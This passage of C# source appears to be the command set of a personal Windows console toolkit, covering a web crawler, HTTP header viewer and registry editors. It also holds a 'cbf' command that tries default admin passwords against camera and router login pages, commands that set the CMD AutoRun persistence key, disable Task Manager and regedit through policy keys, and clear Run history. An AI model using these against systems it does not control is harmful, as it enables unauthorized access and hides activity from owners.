                                    string r = System.Text.Encoding.ASCII.GetString(data);
                                    if (a.GetSw("d"))
                                    {
                                        Uri tu = new Uri(u);
                                        string p = Path.Combine(Environment.CurrentDirectory, "." + tu.LocalPath);
                                        FileInfo fp = new FileInfo(p);
                                        System.IO.Directory.CreateDirectory(fp.Directory.FullName);
                                        if (fp.Name == string.Empty)
                                        {
                                            System.IO.Directory.CreateDirectory(fp.FullName);
                                            fp = new FileInfo(Path.Combine(fp.FullName, "index.html"));
                                        }
                                        try
                                        {
                                            System.IO.File.WriteAllBytes(fp.FullName, data);
                                        }
                                        catch (Exception) { }
                                    }
                                    bool ignore_ = false;
                                    string noget = u.Split('?')[0].Split('#')[0];
                                    foreach (string sg in ignore)
                                    {
                                        if (noget.EndsWith(sg))
                                        {
                                            ignore_ = true; break;
                                        }
                                    }
                                    if (!ignore_)
                                    {
                                        foreach (Regex rg in rgs)
                                        {
                                            Match mt = rg.Match(r);
                                            while (mt != null)
                                            {
                                                if (!mt.Success) break;
                                                int i = -1;
                                                foreach (Group g in mt.Groups)
                                                {
                                                    i++;
                                                    if (i == 0) { continue; }
                                                    string newurl = g.Value.Trim(trims);
                                                    if (Loop.Contains(newurl)) continue;
                                                    Loop.Add(newurl);
                                                    if (!newurl.StartsWith("http"))
                                                    {
                                                        newurl = Funcs.JoinUrl(u, newurl);
                                                    }
                                                    else if (newurl.StartsWith("//"))
                                                    {
                                                        newurl = "http:" + newurl;
                                                    }
                                                    newurl = new Uri(newurl).ToString();
                                                    if (newurl.Length == 0) { continue; }
                                                    if (!newurl.ToLower().Contains(starturl.ToLower())) { continue; }
                                                    if (!crawled.Contains(newurl))
                                                    {
                                                        if (newurl.Length == 0) { continue; }
                                                        crawled.Add(newurl);
                                                        tocrawl.Enqueue(newurl);
                                                    }
                                                }
                                                mt = mt.NextMatch();
                                            }
                                        }
                                    }
                                }
                                catch (Exception) { }
                                Thread.Sleep(50);
                                working--;
                            }
                            Thread.Sleep(100);
                        }
                    };
                    int c = 10;
                    crawl_th = new Thread[c];
                    for (int i = 0; i < c; i++)
                    {
                        crawl_th[i] = new Thread(() => crawl());
                        crawl_th[i].Start();
                        Thread.Sleep(10);
                    }
                    //Thread.Sleep(500);
                    int delay = 0;
                    while (delay < 3)
                    {
                        if (working == 0 && tocrawl.Count == 0 && crawlprint.Count == 0)
                        {
                            delay++;
                        }
                        else
                        {
                            delay = 0;
                        }
                        if (crawlprint.Count > 0)
                        {
                            t.ColorWrite("$a{0}", crawlprint.Dequeue());
                        }
                        //t.WriteLine(working);
                        Thread.Sleep(100);
                    }
                    docrawl = false;
                    return null;
                },
                Exit = () =>
                {
                    if (crawl_th != null)
                        foreach (Thread th in crawl_th)
                        {
                            if (th != null) th.Abort();
                        }
                }
            }.Save(C, new string[] { "crawl" }, __debug__);
            #endregion
            #region NetWatch Command
            new Command
            {
                Help = new CommandHelp
                {

                },
                Main = (Argumenter a) =>
                {
                    Ping p = new Ping();
                    t.ColorWrite("$eWaiting for internet connection");
                    while( true )
                    {
                        if (p.Send("8.8.8.8").Status == IPStatus.Success) break;
                        Thread.Sleep(200);
                    }
                    t.ColorWrite("$aInternet is up!");
                    Funcs.QuickThread(() => MessageBox.Show("Internet is up!", m.Name, MessageBoxButtons.OK, MessageBoxIcon.Information));
                    return null;
                },
            }.Save(C, new string[] { "netwatch" }, __debug__);
            #endregion
            #region Head Command
            new Command
            {
                Help = new CommandHelp
                {

                },
                Main = (Argumenter a) =>
                {
                    foreach (string s in a.VarArgs())
                    {
                        string url = s;
                        if ( !s.StartsWith("http") )
                        {
                            url = "http://" + s.TrimStart(new char[] { '/', '\\', ':' });
                        }
                        Uri u = new Uri(url);
                        HttpWebRequest w = (HttpWebRequest)HttpWebRequest.Create(u);
                        w.Method = "HEAD";
                        w.Headers["UserAgent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36";
                        WebResponse r = w.GetResponse();
                        t.ColorWrite("$e{0}\n", u);
                        int l = r.Headers.AllKeys.OrderBy(o => o.Length).Last().Length;
                        foreach (string k in r.Headers.AllKeys)
                        {
                            string v = r.Headers[k];
                            t.ColorWrite("$a{0} $f{1}\n", k.PadRight(l+2), v);
                        }
                    }
                    return null;
                },
            }.Save(C, new string[] { "head" }, __debug__);
            #endregion
            #region CBF Command
            new Command
            {
                Help = new CommandHelp
                {

                },
                Main = (Argumenter a) =>
                {
                    List<string> pws = new List<string>()
                    {
                        "admin:admin",
                        "admin:12345",
                    };
                    List<string> methods = new List<string>()
                    {
                        "/ISAPI/Security/userCheck",
                        "/goform/webLogin"
                    };
                    Uri u = Funcs.ArgToUrl(a.Get(1));
                    int i = -1;
                    foreach (string str in methods)
                    {
                        i++;
                        string turl = Funcs.JoinUrl(u.ToString(), str);
                        HttpWebRequest test = (HttpWebRequest)HttpWebRequest.Create(turl);
                        try
                        {
                            WebResponse r = test.GetResponse();
                        }
                        catch (System.Net.WebException)
                        {
                            continue;
                        }
                        t.ColorWrite("$aMethod found: $f{0}", str);
                        foreach (string p in pws)
                        {
                            HttpWebRequest w = (HttpWebRequest)HttpWebRequest.Create(turl);
                            w.AllowAutoRedirect = false;

                            bool success = false;
                            try
                            {
                                if (i == 0)
                                {
                                    Regex rg = new Regex(">200<");

                                    string b64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(p));

                                    w.Headers[HttpRequestHeader.Authorization] = string.Format("Basic {0}", b64);
                                    w.Headers["X-Requested-With"] = "XMLHttpRequest";
                                    WebResponse r = w.GetResponse();
                                    string st = "";
                                    using (StreamReader sr = new StreamReader(r.GetResponseStream()))
                                    {
                                        st = sr.ReadToEnd();
                                    }
                                    //t.WriteLine(st);
                                    if (rg.IsMatch(st))
                                    {
                                        success = true;
                                    }
                                }
                                if(i == 1)
                                {
                                    Regex rg = new Regex("\\/menu\\.asp");
                                    w.Method = "POST";
                                    using (StreamWriter sw = new StreamWriter(w.GetRequestStream()))
                                    {
                                        sw.WriteLine("User={0}&Passwd={1}&submit=Login", p.Split(':')[0], p.Split(':')[1]);
                                        sw.Flush();
                                    }
                                    WebResponse r = w.GetResponse();
                                    string st = "";
                                    using (StreamReader sr = new StreamReader(r.GetResponseStream()))
                                    {
                                        st = sr.ReadToEnd();
                                    }
                                    if (rg.IsMatch(st))
                                    {
                                        success = true;
                                    }
                                }
                                if (success)
                                {
                                    t.ColorWrite("$aLogin found: $e{0}", p);
                                    return null;
                                }
                            } catch(Exception) { }
                        }
                    }
                    return null;
                },
            }.Save(C, new string[] { "cbf" }, __debug__);
            #endregion
            #region Example Command
            new Command
            {
                Help = new CommandHelp
                {

                },
                Main = (Argumenter a) =>
                {
                    // http://187.19.14.178/
                    Regex FormRegex = new Regex("<form([^>]*)>([^\0]+?)</form>", RegexOptions.Multiline | RegexOptions.IgnoreCase | RegexOptions.Compiled);
                    Regex InputRegex = new Regex("<input([^>]*)\\/?>", RegexOptions.Multiline | RegexOptions.IgnoreCase | RegexOptions.Compiled);
                    Uri u = Funcs.ArgToUrl(a.Get(1));
                    HttpWebRequest w = (HttpWebRequest)HttpWebRequest.Create(u);
                    WebResponse r = Funcs.SafeFetch(w);
                    string s = "";
                    if ( r != null )
                    {
                        s = Funcs.SafeRead(r);
                    }
                    List<string> forms = new List<string>();
                    foreach( Match f in FormRegex.Matches(s) )
                    {
                        string Tag = f.Groups[1].Value;
                        string Inside = f.Groups[2].Value;
                        foreach ( Match i in InputRegex.Matches(s))
                        {
                            t.WriteLine("{0}", i.Value);
                            Funcs.MatchHTMLTag(i.Groups[1].Value);
                        }
                    }
                    return null;
                },
            }.Save(C, new string[] { "vsc" }, __debug__);
            #endregion
            #endregion

            #region Registry Commands
            #region Reg Command ( REGistry )
            Dictionary<string, RegistryKey> rk = new Dictionary<string, RegistryKey>
            {
                { "HKCU", Registry.CurrentUser },
                { "HKLM", Registry.LocalMachine },
                { "HKCR", Registry.ClassesRoot },
                { "HKCC", Registry.CurrentConfig },
                { "HKU", Registry.Users },
            };
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Modifies the Windows registry",
                    LongDesc = "\n".Join(rk.Select(o => string.Format("{0} - {1}", o.Key, o.Value)).ToArray()),
                    Examples = Util.Array("{NAME} 'HKCU/Example/Key/Value=1'")
                },
                Main = (Argumenter a) =>
                {
                    foreach (string s in a.VarArgs())
                    {
                        try
                        {
                            bool wm = s.Split('=').Length > 1;
                            string kn = "";
                            string k = s.Substring(0, s.IndexOf('='));
                            string v = s.Substring(k.Length + 1);
                            string[] ks = k.Replace('\\', '/').Split('/');
                            RegistryKey r = null;
                            int i = 0;
                            foreach (string p in ks)
                            {
                                if (++i == 1)
                                {
                                    if (!rk.ContainsKey(p.ToUpper())) break;
                                    r = rk[p.ToUpper()];
                                }
                                else if (i != ks.Length)
                                {
                                    if (wm && !r.GetSubKeyNames().Contains(p, StringComparer.InvariantCultureIgnoreCase))
                                    {
                                        r.CreateSubKey(p);
                                    }
                                    r = r.OpenSubKey(p, wm);
                                }
                                else
                                {
                                    kn = p;
                                }
                            }
                            if (wm)
                            {
                                try
                                {
                                    int p = int.Parse(v);
                                    r.SetValue(kn, p, RegistryValueKind.DWord);
                                }
                                catch (Exception)
                                {
                                    r.SetValue(kn, v);
                                }
                            }
                            t.ColorWrite("$e{0}/$a{1}$f = $8({2}) $f{3}", r.Name.Replace('\\', '/'), kn, r.GetValueKind(kn), r.GetValue(kn));
                        }
                        catch (Exception) { t.ColorWrite("$cError"); }
                    }
                    return null;
                },
            }.Save(C, new string[] { "reg" }, __debug__);
            #endregion
            #region QuickEdit Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Enables quickedit mode for console",
                    Usage = Util.Array("{NAME}")
                },
                Main = (Argumenter a) =>
                {
                    RegistryKey r = Registry.CurrentUser.OpenSubKey("Console", true);
                    string s = m.FileName.Replace(Util.Array("\\", "/", " "), "_");

                    if (!r.GetSubKeyNames().Contains(s))
                        r.CreateSubKey(s);

                    r.SetValue("QuickEdit", 1, RegistryValueKind.DWord);
                    Process.Start(m.FileName);
                    Environment.Exit(0);
                    return null;
                },
            }.Save(C, new string[] { "quickedit" }, __debug__);
            #endregion
            #region CAR Command ( Cmd Auto Run )
            new Command
            {
                Switches = Util.Array("s"),
                Help = new CommandHelp
                {
                    Description = "Changes the command that get run when cmd is open",
                    Usage = Util.Array("{NAME} [command]"),
                    Switches = new Dictionary<string, string> { { "s", "Use HKLM" } }
                },
                Main = (Argumenter a) =>
                {
                    string k = (a.GetSw("s") ? "HKLM" : "HKCU") + "\\Software\\Microsoft\\Command Processor\\AutoRun";
                    m.RunCommand(string.Format("reg '{0}={1}' > nul", k, a.Get(1).Replace("'", "&'")));
                    return null;
                },
            }.Save(C, new string[] { "car" }, __debug__);
            #endregion
            #region Rules Command
            Dictionary<string, string> Rules = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
        {
            { "!CMD", @"Software\Policies\Microsoft\Windows\System;DisableCMD" },
            { "!Run", @"Software\Policies\Microsoft\Windows\System;NoRun" },
            { "!TaskMGR", @"Software\Microsoft\Windows\CurrentVersion\Policies;DisableTaskMgr" },
            { "!MSI", @"Software\Policies\Microsoft\Windows\Installer;DisableMSI" },
            { "!Regedit", @"Software\Microsoft\Windows\CurrentVersion\Policies\System;DisableRegistryTools" },
            { "!ControlPanel", @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer;NoControlPanel" },
            { "!SetBG", @"Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop;NoChangingWallPaper" },
            { "!TrayMenu", @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer;NoTrayContextMenu" },
            { "!WindowsUpdate", @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer;NoWindowsUpdate" },
            { "!Shutdown", @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer;NoClose" },
            { "!Install", @"Software\Microsoft\Windows\CurrentVersion\Policies\Uninstall;NoAddRemovePrograms" },
            { "!SetTaskbar", @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer;NoSetTaskbar" },
            { "!Desktop", @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer;NoDesktop" },
            { "!SetPW", @"Software\Microsoft\Windows\CurrentVersion\Policies\System;Disable Change Password" },
        };
            new Command
            {
                Switches = new string[] { "s" },
                Help = new CommandHelp
                {
                    Description = "Changes windows policies",
                    Usage = new string[]
                    {
                    "{NAME}",
                    "{NAME} [rule=$atrue$7] [rule=$cfalse$7]",
                    "{NAME} [rule=$a1$7] [rule=$c0$7]",
                    "{NAME} [rule=$ay$7] [rule=$cn$7]",
                    "{NAME} [rule=$ayes$7] [rule=$cno$7]",
                    "{NAME} [rule=$aenable$7] [rule=$cdisable$7]",
                    },
                    Examples = new string[]
                    {
                    "{NAME}",
                    "{NAME} cmd=disable regedit=enable"
                    },
                    Switches = new Dictionary<string, string>
                {
                    { "s", "System wide" }
                }
                },
                Main = (Argumenter a) =>
                {
                    if (a.GetSw("s") && !Funcs.IsAdmin())
                    {
                        t.ColorWrite("$cAdministrator rights required.");
                        return null;
                    }
                    RegistryKey r = Registry.CurrentUser;
                    if (a.GetSw("s")) r = Registry.LocalMachine;

                    if (a.Get(1).Length == 0)
                    {
                        foreach (KeyValuePair<string, string> s in Rules)
                        {
                            bool invert = s.Key.StartsWith("!");
                            string[] v = s.Value.Split(';');
                            object vl = null;
                            string Value = "";
                            try
                            {
                                Funcs.MakeKeyTree(v[0], r);
                                try { vl = r.OpenSubKey(v[0]).GetValue(v[1]); } catch (Exception) { }
                                bool bl = int.Parse((Equals(vl, null) ? "0" : vl).ToString()) != 0;
                                if (invert) bl = !bl;
                                Value = bl ? "$aEnabled" : "$cDisabled";
                            }
                            catch (UnauthorizedAccessException) { Value = "$eAccess Denied"; }
                            catch (Exception) { Value = "$eERROR"; }
                            t.ColorWrite("$6{0} = " + Value, s.Key.Replace("!", ""));
                        }
                    }
                    else
                    {
                        foreach (string rs in a.Parsed.Skip(1).StringArray())
                        {
                            bool invert = false;
                            if (rs.Split('=').Length != 2) { continue; }
                            string res = rs.Split('=')[0].ToLower();
                            string val = rs.Split('=')[1].ToLower();

                            bool VAL = false;
                            if ((val == "true") ||
                                (val + "0")[0] == '1' ||
                                (val + "0")[0] == 'y' ||
                                (val.StartsWith("enable")))
                                VAL = true;

                            if (!Rules.ContainsKey(res))
                            {
                                res = "!" + res;
                                invert = true;
                            }
                            if (Rules.ContainsKey(res))
                            {
                                string s = Rules[res];
                                string[] v = s.Split(';');
                                string Value = "";
                                try
                                {
                                    Funcs.MakeKeyTree(v[0], r);
                                    r.OpenSubKey(v[0], true).SetValue(v[1], (invert ? !VAL : VAL) ? 1 : 0, RegistryValueKind.DWord);
                                    object vl = null;
                                    try { vl = r.OpenSubKey(v[0]).GetValue(v[1]); } catch (Exception) { }
                                    bool bl = int.Parse((Equals(vl, null) ? "0" : vl).ToString()) != 0;
                                    if (invert) bl = !bl;
                                    Value = bl ? "$aEnabled" : "$cDisabled";
                                }
                                catch (UnauthorizedAccessException) { Value = "$eAccess Denied"; }
                                catch (Exception) { Value = "$eERROR"; }
                                t.ColorWrite("$6{0} = " + Value, res.Replace("!", ""));
                            }
                            else
                            {
                                t.ColorWrite("$cInvalid key.");
                            }
                        }
                    }
                    return null;
                },
            }.Save(C, new string[] { "rule" });
            #endregion
            #region RunClear Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Clears programs that show up in windows+r",
                    Usage = Util.Array("{NAME}")
                },
                Main = (Argumenter a) =>
                {
                    RegistryKey r = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU", true);
                    string az = "abcdefghijklmnopqrstuvwxyz";
                    List<char> keys = new List<char>();
                    foreach (string s in r.GetValueNames())
                    {
                        if (az.Contains(s))
                        {
                            keys.Add(s[0]);
                        }
                    }
                    foreach (char c in keys)
                    {
                        r.DeleteValue(c.ToString());
                    }
                    t.ColorWrite("$aRun cleared!");
                    return null;
                },
            }.Save(C, new string[] { "runclear" }, __debug__);
            #endregion
            #region AR Command ( Auto Run )
            List<RegAutorun> arl = new List<RegAutorun>();
            RegDef[] regs = new RegDef[]
            {
                new RegDef { Reg = Registry.CurrentUser, Path = @"Software\Microsoft\Windows\CurrentVersion\Run", Letters = "CR" },
                new RegDef { Reg = Registry.CurrentUser, Path = @"Software\Microsoft\Windows\CurrentVersion\RunOnce", Letters = "CO" },
                new RegDef { Reg = Registry.LocalMachine, Path = @"Software\Microsoft\Windows\CurrentVersion\Run", Letters = "MR" },
                new RegDef { Reg = Registry.LocalMachine, Path = @"Software\Microsoft\Windows\CurrentVersion\RunOnce", Letters = "MO" },
            };
            new Command
            {
                Switches = Util.Array("u"),
                Help = new CommandHelp
                {
                    Description = "Modifies autorun command lines from the registry",
                    LongDesc = "Paths: \n" + "\n".Join(regs.Select(o => (string.Format( "$a{0}: $f{1}\\{2}", o.Letters, o.Reg.ToString(), o.Path))).ToArray()),
                    Usage = Util.Array(
                        "{NAME} id=value $8--SET",
                        "{NAME} id= $8--REMOVE",
                        "{NAME} +path/name=value $8--NEW"
                    ),
                    Switches = new Dictionary<string, string>()
                    {
                        { "u", "Force update" }
                    }
                },
                Main = (Argumenter a) =>
                {
                    bool update = a.GetSw("u") || arl.Count == 0;
                    string s = a.RawString();
                    if (s.Contains('='))
                    {
                        string[] st = Funcs.Equal(s);
                        if (st != null)
                        {
                            string k = st[0];
                            string v = st[1];
                            if (k.StartsWith("+"))
                            {
                                string[] y = k.Substring(1).Split('/');
                                if (y.Length != 2)
                                {
                                    return Error("Syntax: \"+CR,Name=Value\"");
                                }
                                RegDef[] mt = regs.Where(o => o.Letters.ToLower() == y[0].ToLower()).ToArray();
                                if (mt.Length!=1)
                                {
                                    return Error(string.Format("List of values: {0}", ", ".Join(regs.Select(o => o.Letters).ToArray())));
                                }
                                RegDef rg = mt.First();
                                try
                                {
                                    rg.Reg.OpenSubKey(rg.Path, true).SetValue(y[1], v);
                                    update = true;

                                } catch(Exception)
                                {
                                    return Error("Error while creating registry key");
                                }
                            } else
                            {
                                int id = Funcs.GetInt(k, -1);
                                if (id >= 0 & id < arl.Count)
                                {
                                    RegAutorun r = arl[id];
                                    try
                                    {
                                        bool success = false;
                                        if (v.Trim() == "")
                                        {
                                            success = r.Remove();
                                        }
                                        else
                                        {
                                            success = r.Modify(v);
                                        }
                                        if (!success) { throw new Exception(); }
                                        update = true;
                                    }
                                    catch (Exception)
                                    {
                                        return Error("Error while modifying registry key");
                                    }
                                } else
                                {
                                    return Error("Invalid id");
                                }
                            }
                        }
                    }
                    if (update)
                    {
                        arl = new List<RegAutorun>();
                        foreach (RegDef r in regs) {
                            arl = arl.Concat(AutorunFetch.Fetch(r)).ToList();
                        }
                    }
                    int i = 0;
                    foreach ( RegAutorun str in arl )
                    {
                        t.ColorWrite("$f[$2{0}$f] $a{1} $f- $e{2} $f=\n$8{3}", i++, str.Lt, str.Key, str.Data);
                    }
                    return null;
                },
            }.Save(C, new string[] { "ar" }, __debug__);
            #endregion
            #endregion

            foreach (KeyValuePair<string, Command> cmd in C)
            {
                cmd.Value.Think();
            }
            return C;
        }
    }
}